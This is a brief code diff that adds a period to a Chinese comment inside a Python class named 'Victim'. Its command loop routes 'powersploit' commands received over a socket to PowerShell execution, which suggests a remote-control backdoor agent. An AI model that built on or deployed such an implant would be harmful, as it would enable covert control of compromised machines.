@@ -24,7 +24,7 @@ class Victim:
             commlist = command.split()
             if command == 'exit':
                 break
-            # 执行powersploit的命令
+            # 执行powersploit的命令.
             elif commlist[0] == "powersploit":
                 self.run_powershell_commands(commlist[1], self.victimSocket)
                 continue
